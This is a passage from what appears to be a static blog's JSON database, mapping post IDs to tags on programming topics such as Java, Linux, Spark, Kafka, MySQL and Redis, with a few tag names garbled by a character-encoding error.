mh9o00320gtj5wfbfvlt","tag_id":"cjjedmh9h002l0gtjo7g2a57p","_id":"cjjedmh9t003b0gtjexyph2or"},{"post_id":"cjjedmh9p00340gtj3psv84cl","tag_id":"cjjedmh9h002l0gtjo7g2a57p","_id":"cjjedmh9u003d0gtj1awbf21a"},{"post_id":"cjjedmh9q00360gtj5iubzgs9","tag_id":"cjjedmh9h002l0gtjo7g2a57p","_id":"cjjedmh9u003f0gtjpz21ro5g"},{"post_id":"cjjedmh9r00380gtjd93jn9j1","tag_id":"cjjedmh9h002l0gtjo7g2a57p","_id":"cjjedmh9v003h0gtj6lnxr2zj"},{"post_id":"cjjedmh9s003a0gtjne5jv8xh","tag_id":"cjjedmh9h002l0gtjo7g2a57p","_id":"cjjedmh9w003j0gtjw22p3l4y"},{"post_id":"cjjedmh9t003c0gtjjuyvncox","tag_id":"cjjedmh9h002l0gtjo7g2a57p","_id":"cjjedmh9x003l0gtjelqj7vwf"},{"post_id":"cjjedmh9u003e0gtjdf8pptjq","tag_id":"cjjedmh9h002l0gtjo7g2a57p","_id":"cjjedmh9y003n0gtjiie7f33p"},{"post_id":"cjjedmh9v003g0gtjkfl19s2s","tag_id":"cjjedmh9h002l0gtjo7g2a57p","_id":"cjjedmh9z003q0gtjg6iszkab"},{"post_id":"cjjedmh9w003i0gtjhx9zenl0","tag_id":"cjjedmh9h002l0gtjo7g2a57p","_id":"cjjedmha0003s0gtjgvymq09x"},{"post_id":"cjjedmh9w003k0gtjnfiij3l3","tag_id":"cjjedmh9h002l0gtjo7g2a57p","_id":"cjjedmha1003u0gtjz6wueda9"},{"post_id":"cjjedmh9x003m0gtjllnk2gva","tag_id":"cjjedmh9z003p0gtje24c8mit","_id":"cjjedmha2003x0gtjsq98s8q1"},{"post_id":"cjjedmha1003v0gtj2j6mmr9q","tag_id":"cjjedmh9z003p0gtje24c8mit","_id":"cjjedmha4003z0gtj17t5b14h"},{"post_id":"cjjedmh9y003o0gtjg7rb1wfv","tag_id":"cjjedmh9z003p0gtje24c8mit","_id":"cjjedmhaa00420gtj4ey8030n"},{"post_id":"cjjedmh9z003r0gtjyqnr8mxh","tag_id":"cjjedmh9z003p0gtje24c8mit","_id":"cjjedmhac00460gtjaw807g36"},{"post_id":"cjjedmhac00470gtjjz51v96v","tag_id":"cjjedmhab00450gtjcasyxf2k","_id":"cjjedmhae004a0gtjnp5i90q1"},{"post_id":"cjjedmha0003t0gtjgkct7k8j","tag_id":"cjjedmhab00450gtjcasyxf2k","_id":"cjjedmhaf004c0gtjl4fcyqj6"},{"post_id":"cjjedmhad00480gtjhlju8lpu","tag_id":"cjjedmhab00450gtjcasyxf2k","_id":"cjjedmhah004f0gtjsdkvotzk"},{"post_id":"cjjedmhae004b0gtj88htysm7","tag_id":"cjjedmhab00450gtjcasyxf2k","_id":"cjjedmhah004h0gtjd9r1g1p7"},{"post_id":"cjjedmha2003y0gtjqqydd5oh","tag_id":"cjjedmhab00450gtjcasyxf2k","_id":"cjjedmhai004k0gtjbervp0r9"},{"post_id":"cjjedmhaf004d0gtj44ori0uu","tag_id":"cjjedmhab00450gtjcasyxf2k","_id":"cjjedmhaj004m0gtj3mkcftqc"},{"post_id":"cjjedmhah004g0gtjy3pmgrn6","tag_id":"cjjedmhab00450gtjcasyxf2k","_id":"cjjedmhak004p0gtjncm1aoxy"},{"post_id":"cjjedmha400400gtjxxanb2yd","tag_id":"cjjedmhab00450gtjcasyxf2k","_id":"cjjedmhal004r0gtjeasi4vgz"},{"post_id":"cjjedmhah004i0gtjcah4rru4","tag_id":"cjjedmhab00450gtjcasyxf2k","_id":"cjjedmham004t0gtjpjvtxzbu"},{"post_id":"cjjedmhai004l0gtj6dpwd4eu","tag_id":"cjjedmhab00450gtjcasyxf2k","_id":"cjjedmhan004v0gtjggjoetzt"},{"post_id":"cjjedmhaa00430gtj6wbjdmdq","tag_id":"cjjedmhab00450gtjcasyxf2k","_id":"cjjedmhao004x0gtjhdf9t763"},{"post_id":"cjjedmhaj004n0gtjq2gikqc1","tag_id":"cjjedmhab00450gtjcasyxf2k","_id":"cjjedmhao004z0gtjzt5yotng"},{"post_id":"cjjedmhak004q0gtjtb8wjvb5","tag_id":"cjjedmhab00450gtjcasyxf2k","_id":"cjjedmhap00510gtjf4pr3ouk"},{"post_id":"cjjedmhab00440gtjc5hfxhds","tag_id":"cjjedmhab00450gtjcasyxf2k","_id":"cjjedmhaq00530gtjhhw4tb40"},{"post_id":"cjjedmhal004s0gtjr71paglu","tag_id":"cjjedmhab00450gtjcasyxf2k","_id":"cjjedmhar00550gtjqss61neg"},{"post_id":"cjjedmham004u0gtjwsgnpmrf","tag_id":"cjjedmhab00450gtjcasyxf2k","_id":"cjjedmhas00570gtj8y7segfa"},{"post_id":"cjjedmhan004w0gtjekq5n40u","tag_id":"cjjedmhab00450gtjcasyxf2k","_id":"cjjedmhat00590gtjttknh8ok"},{"post_id":"cjjedmhao004y0gtj32beaal8","tag_id":"cjjedmhab00450gtjcasyxf2k","_id":"cjjedmhau005b0gtjnqzsriky"},{"post_id":"cjjedmhap00500gtj2gjca17n","tag_id":"cjjedmhab00450gtjcasyxf2k","_id":"cjjedmhav005d0gtjbg13i3ab"},{"post_id":"cjjedmhap00520gtjqvml0jpz","tag_id":"cjjedmhab00450gtjcasyxf2k","_id":"cjjedmhav005f0gtj0pjwhon1"},{"post_id":"cjjedmhaq00540gtja9up8fi3","tag_id":"cjjedmhab00450gtjcasyxf2k","_id":"cjjedmhax005h0gtjddh80gd7"},{"post_id":"cjjedmhar00560gtjz61pa9ql","tag_id":"cjjedmhab00450gtjcasyxf2k","_id":"cjjedmhax005j0gtjfylgosd4"},{"post_id":"cjjedmhas00580gtjqrnbmn98","tag_id":"cjjedmhab00450gtjcasyxf2k","_id":"cjjedmhay005l0gtjhym89gyt"},{"post_id":"cjjedmhat005a0gtjd6xdvi6r","tag_id":"cjjedmhab00450gtjcasyxf2k","_id":"cjjedmhaz005n0gtjudr9kfak"},{"post_id":"cjjedmhau005c0gtj2o80y5g5","tag_id":"cjjedmhab00450gtjcasyxf2k","_id":"cjjedmhb0005p0gtjp1wqgz46"},{"post_id":"cjjedmhav005e0gtjkkqymf8v","tag_id":"cjjedmhab00450gtjcasyxf2k","_id":"cjjedmhb1005s0gtj69w4jiva"},{"post_id":"cjjedmhaw005g0gtj4j2puli6","tag_id":"cjjedmhab00450gtjcasyxf2k","_id":"cjjedmhb2005u0gtjbzjyz5xr"},{"post_id":"cjjedmhax005i0gtj8terne7s","tag_id":"cjjedmhab00450gtjcasyxf2k","_id":"cjjedmhb3005w0gtjbagdkyhl"},{"post_id":"cjjedmhay005k0gtjs68x30di","tag_id":"cjjedmhab00450gtjcasyxf2k","_id":"cjjedmhb4005z0gtjyenx7lli"},{"post_id":"cjjedmhay005m0gtjyj8ntlys","tag_id":"cjjedmhab00450gtjcasyxf2k","_id":"cjjedmhb500610gtjb8faufq2"},{"post_id":"cjjedmhb2005v0gtjg76kn9b7","tag_id":"cjj2qgrfh0002m0tjka6jam34","_id":"cjjedmhb600640gtjf8l9tp38"},{"post_id":"cjjedmhaz005o0gtjbhm2k317","tag_id":"cjjedmhb1005r0gtjx9x4e5wk","_id":"cjjedmhb700660gtjxgd7aqdh"},{"post_id":"cjjedmhb3005x0gtjs8gfm5uy","tag_id":"cjjedmhb1005r0gtjx9x4e5wk","_id":"cjjedmhb800680gtj2kl53rs3"},{"post_id":"cjjedmhb400600gtjztxklrk6","tag_id":"cjj2qgrfh0002m0tjka6jam34","_id":"cjjedmhb9006a0gtjpp13rdys"},{"post_id":"cjjedmhb0005q0gtjdk5do606","tag_id":"cjjedmhb1005r0gtjx9x4e5wk","_id":"cjjedmhba006c0gtjkrjrp844"},{"post_id":"cjjedmhb500620gtjlo486sdg","tag_id":"cjj2qgrfh0002m0tjka6jam34","_id":"cjjedmhbb006e0gtjei2jxtfm"},{"post_id":"cjjedmhb600650gtj2kum8amo","tag_id":"cjj2qgrfh0002m0tjka6jam34","_id":"cjjedmhbc006g0gtjtyf4jbtx"},{"post_id":"cjjedmhb1005t0gtjxvoa4bks","tag_id":"cjjedmhb1005r0gtjx9x4e5wk","_id":"cjjedmhbd006i0gtjuabel3j7"},{"post_id":"cjjedmhb700670gtj2fjtm52k","tag_id":"cjj2qgrfh0002m0tjka6jam34","_id":"cjjedmhbd006k0gtjne8cnq9m"},{"post_id":"cjjedmhb800690gtj0d0h45j4","tag_id":"cjj2qgrfh0002m0tjka6jam34","_id":"cjjedmhbe006m0gtje6hkqe0v"},{"post_id":"cjjedmhb9006b0gtjx3b3qjak","tag_id":"cjj2qgrfh0002m0tjka6jam34","_id":"cjjedmhbf006o0gtj9zkg5tt5"},{"post_id":"cjjedmhba006d0gtjdlg49vku","tag_id":"cjj2qgrfh0002m0tjka6jam34","_id":"cjjedmhbg006q0gtj2gzwrkur"},{"post_id":"cjjedmhbb006f0gtj77uvk3nj","tag_id":"cjj2qgrfh0002m0tjka6jam34","_id":"cjjedmhbh006s0gtjrdor0j56"},{"post_id":"cjjedmhbc006h0gtj17a430gc","tag_id":"cjj2qgrfh0002m0tjka6jam34","_id":"cjjedmhbi006u0gtjk0tx0d0a"},{"post_id":"cjjedmhbd006j0gtjrxtg4s67","tag_id":"cjj2qgrfh0002m0tjka6jam34","_id":"cjjedmhbj006w0gtjcy79a4gj"},{"post_id":"cjjedmhbe006l0gtj7rv1za08","tag_id":"cjj2qgrfh0002m0tjka6jam34","_id":"cjjedmhbk006y0gtjmzuzaw12"},{"post_id":"cjjedmhbe006n0gtj1jhlpy3n","tag_id":"cjj2qgrfh0002m0tjka6jam34","_id":"cjjedmhbl00700gtj8wywwjcj"},{"post_id":"cjjedmhbg006p0gtjdamymznv","tag_id":"cjj2qgrfh0002m0tjka6jam34","_id":"cjjedmhbm00720gtjg923k80w"},{"post_id":"cjjedmhbh006r0gtj7vf63crk","tag_id":"cjj2qgrfh0002m0tjka6jam34","_id":"cjjedmhbn00740gtj1zb96hlu"},{"post_id":"cjjedmhbh006t0gtjdv0yx6kz","tag_id":"cjj2qgrfh0002m0tjka6jam34","_id":"cjjedmhbo00760gtj45sdmy6v"},{"post_id":"cjjedmhbi006v0gtj2429p56i","tag_id":"cjj2qgrfh0002m0tjka6jam34","_id":"cjjedmhbp00780gtju5fjjmi2"},{"post_id":"cjjedmhbj006x0gtjxdlzs37n","tag_id":"cjj2qgrfh0002m0tjka6jam34","_id":"cjjedmhbq007a0gtj0nnz7f54"},{"post_id":"cjjedmhbk006z0gtjopdv6p2a","tag_id":"cjj2qgrfh0002m0tjka6jam34","_id":"cjjedmhbr007c0gtjrxbv3wp1"},{"post_id":"cjjedmhbl00710gtjue70gx01","tag_id":"cjj2qgrfh0002m0tjka6jam34","_id":"cjjedmhbs007e0gtjolq387cc"},{"post_id":"cjjedmhbm00730gtjmi1ure19","tag_id":"cjj2qgrfh0002m0tjka6jam34","_id":"cjjedmhbt007h0gtjv3ru0at3"},{"post_id":"cjjedmhbn00750gtjrzftvfg6","tag_id":"cjj2qgrfh0002m0tjka6jam34","_id":"cjjedmhbt007j0gtjuprej12l"},{"post_id":"cjjedmhbo00770gtjrn8x32m7","tag_id":"cjj2qgrfh0002m0tjka6jam34","_id":"cjjedmhbu007l0gtjfnv8f5wo"},{"post_id":"cjjedmhbp00790gtj68dbj2wa","tag_id":"cjj2qgrfh0002m0tjka6jam34","_id":"cjjedmhbw007o0gtj8g12hdl1"},{"post_id":"cjjedmhbq007b0gtjk976z3yi","tag_id":"cjj2qgrfh0002m0tjka6jam34","_id":"cjjedmhbx007q0gtjz2jpzfeh"},{"post_id":"cjjedmhbu007k0gtjbc2hhmyz","tag_id":"cjjedmhbs007g0gtj5bykosws","_id":"cjjedmhbz007t0gtjf2gdufha"},{"post_id":"cjjedmhbr007d0gtj7xczoaep","tag_id":"cjjedmhbs007g0gtj5bykosws","_id":"cjjedmhc1007v0gtj545ergmq"},{"post_id":"cjjedmhbv007m0gtjddmuuvg8","tag_id":"cjjedmhbs007g0gtj5bykosws","_id":"cjjedmhc2007x0gtjxny0riqz"},{"post_id":"cjjedmhbx007p0gtjl3d97a55","tag_id":"cjjedmhbs007g0gtj5bykosws","_id":"cjjedmhc4007z0gtj4t0xk8tp"},{"post_id":"cjjedmhbs007f0gtjxfpprrvt","tag_id":"cjjedmhbs007g0gtj5bykosws","_id":"cjjedmhc500810gtj53u2v8hj"},{"post_id":"cjjedmhby007r0gtj7uhf0svr","tag_id":"cjjedmhbs007g0gtj5bykosws","_id":"cjjedmhc600830gtjj1dufxxm"},{"post_id":"cjjedmhbz007u0gtj7wq0yzcq","tag_id":"cjjedmhbs007g0gtj5bykosws","_id":"cjjedmhc700850gtj8ijkmehs"},{"post_id":"cjjedmhbt007i0gtjogvhm688","tag_id":"cjjedmhbs007g0gtj5bykosws","_id":"cjjedmhc700860gtjpf7p2rlu"},{"post_id":"cjjedmhc1007w0gtjsghwbi89","tag_id":"cjjedmhbs007g0gtj5bykosws","_id":"cjjedmhc700870gtjqwruciy7"},{"post_id":"cjjedmhc2007y0gtjdnjtww6i","tag_id":"cjjedmhbs007g0gtj5bykosws","_id":"cjjedmhc800880gtj1q342ci1"},{"post_id":"cjjedmhc400800gtjlzbqnxny","tag_id":"cjjedmhbs007g0gtj5bykosws","_id":"cjjedmhc800890gtjcs9el129"},{"post_id":"cjjedmhc500820gtjahcb7v1d","tag_id":"cjjedmhc700840gtjaiksc7rw","_id":"cjjedmhc8008a0gtjwnc30qr7"},{"post_id":"cjjedmhcc008b0gtjsm5i56un","tag_id":"cjjedmhc700840gtjaiksc7rw","_id":"cjjedmhce008d0gtjbhjqv5qj"},{"post_id":"cjjedmhcd008c0gtjz3flh66x","tag_id":"cjjedmhcf008f0gtj33u9tmmb","_id":"cjjedmhcj008k0gtj87e0cnb4"},{"post_id":"cjjedmhd6009g0gtjdhjfd7zd","tag_id":"cjjedmhd8009l0gtjz0nlk2a5","_id":"cjjedmhd8009n0gtjiymnq01o"},{"post_id":"cjjedmhdf009s0gtj5jix11j9","tag_id":"cjjedmhde009q0gtjp71zrxij","_id":"cjjedmhdi009v0gtjfzhqufds"},{"post_id":"cjjedmhdb009o0gtjc35gg8ul","tag_id":"cjjedmhde009q0gtjp71zrxij","_id":"cjjedmhdj009x0gtj61o57kkw"},{"post_id":"cjjedmhdh009t0gtjelngbd1n","tag_id":"cjjedmhde009q0gtjp71zrxij","_id":"cjjedmhdl00a00gtjdh33e2wx"},{"post_id":"cjjedmhdj009w0gtjadu6fa2q","tag_id":"cjjedmhde009q0gtjp71zrxij","_id":"cjjedmhdm00a20gtj4arjulc2"},{"post_id":"cjjedmhdc009p0gtjjbvaz99b","tag_id":"cjjedmhde009q0gtjp71zrxij","_id":"cjjedmhdm00a40gtjo32f69w8"},{"post_id":"cjjedmhdj009y0gtj9l4qazmr","tag_id":"cjjedmhde009q0gtjp71zrxij","_id":"cjjedmhdn00a60gtjuoqvgeak"},{"post_id":"cjjedmhdl00a10gtj4t2v0p92","tag_id":"cjjedmhdk009z0gtj076awcc2","_id":"cjjedmhdo00a80gtj37ctsepo"},{"post_id":"cjjedmhde009r0gtj9r86uulw","tag_id":"cjjedmhdk009z0gtj076awcc2","_id":"cjjedmhdp00aa0gtjkuc6gj1g"},{"post_id":"cjjedmhdm00a30gtjzw6dkv2u","tag_id":"cjjedmhdk009z0gtj076awcc2","_id":"cjjedmhdq00ac0gtju0z4i3h4"},{"post_id":"cjjedmhdn00a50gtjidsn9tkk","tag_id":"cjjedmhdk009z0gtj076awcc2","_id":"cjjedmhdr00ae0gtj2q1at2mt"},{"post_id":"cjjedmhdo00a70gtju9hv69ns","tag_id":"cjjebrtw500002wtjoq7taegx","_id":"cjjedmhds00ag0gtj6xoxxyby"},{"post_id":"cjjedmhdo00a90gtjkvchfbkq","tag_id":"cjjebrtw500002wtjoq7taegx","_id":"cjjedmhdt00ai0gtjo36l1ok3"},{"post_id":"cjjedmhdp00ab0gtjw773b4e0","tag_id":"cjjedmhdk009z0gtj076awcc2","_id":"cjjedmhdu00ak0gtjq4yuhsyp"},{"post_id":"cjjedmhdq00ad0gtjpvm5dhv3","tag_id":"cjjebrtw500002wtjoq7taegx","_id":"cjjedmhdu00al0gtj6dq1fft6"},{"post_id":"cjjedmhdr00af0gtjlexwk5f2","tag_id":"cjjebrtw500002wtjoq7taegx","_id":"cjjedmhdu00am0gtj79bey6gq"},{"post_id":"cjjedmhds00ah0gtjt8aelmes","tag_id":"cjjebrtw500002wtjoq7taegx","_id":"cjjedmhdu00an0gtj6oo3zr5c"},{"post_id":"cjjedmhdt00aj0gtjyrhl3ap7","tag_id":"cjjebrtw500002wtjoq7taegx","_id":"cjjedmhdu00ao0gtjsi0wxnc7"},{"post_id":"cjjedmhdx00ap0gtj11j52ycn","tag_id":"cjjebrtw500002wtjoq7taegx","_id":"cjjedmhdy00aq0gtjklv6ogs2"},{"post_id":"cjjedmh90001p0gtjpe47elb9","tag_id":"cjjedmh8u001e0gtjlyi35kg8","_id":"cjjfps5p80000c0tj8j7asw4u"},{"post_id":"cjjedmhcf008g0gtjmnywhvdu","tag_id":"cjjfps5rp0001c0tjsjnzfggy","_id":"cjjfps5si0002c0tj827z7w06"},{"post_id":"cjjedmhcp008w0gtjo6b5nw7y","tag_id":"cjjfps5sj0003c0tjegym195j","_id":"cjjfps5sn0005c0tjhqig0hkg"},{"post_id":"cjjedmhcr008z0gtj3rzhy3s6","tag_id":"cjjfps5sj0003c0tjegym195j","_id":"cjjfps5so0006c0tj312evtv3"},{"post_id":"cjjedmhcs00910gtjb3l3cicp","tag_id":"cjjfps5sj0003c0tjegym195j","_id":"cjjfps5t40008c0tjru0jup7i"},{"post_id":"cjjedmhch008h0gtjx23jyv0c","tag_id":"cjjfps5ss0007c0tjasmqe2ax","_id":"cjjfps5t8000ac0tjw6dy4wmr"},{"post_id":"cjjedmhce008e0gtjezafu10r","tag_id":"cjjfps5ss0007c0tjasmqe2ax","_id":"cjjfps5ta000cc0tj1ish0jwe"},{"post_id":"cjjedmhco008u0gtjpnjddc00","tag_id":"cjjfps5sj0003c0tjegym195j","_id":"cjjfps5tc000ec0tjwziq6r6v"},{"post_id":"cjjedmhcm008r0gtj09zjsno1","tag_id":"cjjfps5ss0007c0tjasmqe2ax","_id":"cjjfps5tc000fc0tjstbobbcf"},{"post_id":"cjjedmhci008i0gtjgd4ikszr","tag_id":"cjjfps5ss0007c0tjasmqe2ax","_id":"cjjfps5tc000gc0tj3blv8xb5"},{"post_id":"cjjedmhck008m0gtjfvtzr2vu","tag_id":"cjjfps5ss0007c0tjasmqe2ax","_id":"cjjfps5td000hc0tj7mc1dlx2"},{"post_id":"cjjedmhcj008l0gtj2m8mptir","tag_id":"cjjfps5ss0007c0tjasmqe2ax","_id":"cjjfps5td000ic0tjdu392tqh"},{"post_id":"cjjedmhd4009c0gtjpvwdk03s","tag_id":"cjjfps5tc000dc0tj66tth28s","_id":"cjjfps5td000jc0tj3n96bx6j"},{"post_id":"cjjedmhcl008p0gtjrnhbg1u0","tag_id":"cjjfps5ss0007c0tjasmqe2ax","_id":"cjjfps5tl000kc0tj3eyen5rc"},{"post_id":"cjjedmhd4009d0gtj48673y5p","tag_id":"cjjfps5tc000dc0tj66tth28s","_id":"cjjfps5tm000lc0tjv20p3291"},{"post_id":"cjjedmhd5009f0gtj1tijqr17","tag_id":"cjjfps5tc000dc0tj66tth28s","_id":"cjjfps5tt000mc0tjxli2tcq6"}],"Tag":[{"name":"python","_id":"cjj2qgrfh0002m0tjka6jam34"},{"name":"redis","_id":"cjjebrtw500002wtjoq7taegx"},{"name":"note","_id":"cjjedmh6x00020gtjewnnuhij"},{"name":"Hadoop","_id":"cjjedmh8u001e0gtjlyi35kg8"},{"name":"JavaScript","_id":"cjjedmh92001s0gtjbndkazgf"},{"name":"Java","_id":"cjjedmh9h002l0gtjo7g2a57p"},{"name":"Jstrom","_id":"cjjedmh9z003p0gtje24c8mit"},{"name":"Linux","_id":"cjjedmhab00450gtjcasyxf2k"},{"name":"kafka","_id":"cjjedmhb1005r0gtjx9x4e5wk"},{"name":"spark","_id":"cjjedmhbs007g0gtj5bykosws"},{"name":"web","_id":"cjjedmhc700840gtjaiksc7rw"},{"name":"work","_id":"cjjedmhcf008f0gtj33u9tmmb"},{"name":"��������","_id":"cjjedmhci008j0gtjm5m5u4ex"},{"name":"����","_id":"cjjedmhck008n0gtjxfamk3gs"},{"name":"���ݿ�","_id":"cjjedmhct00920gtjhu4jmhj6"},{"name":"��Ŀ","_id":"cjjedmhd5009e0gtjb8i56dq7"},{"name":"scala","_id":"cjjedmhd8009l0gtjz0nlk2a5"},{"name":"mysql","_id":"cjjedmhde009q0gtjp71zrxij"},{"name":"oracle","_id":"cjjedmhdk009z0gtj076awcc2"},{"name":"其他","_id":"cjjfps5rp0001c0tjsjnzfggy"},{"name":"数据库","_id":"cjjfps5sj0003c0tjegym195j"},{"name":"开发工具","_id":"cjjfps5ss0007c0tjasmqe2ax"},{"name":"项目","_id":"cjjfps5tc000dc0tj66tth28s"}]}}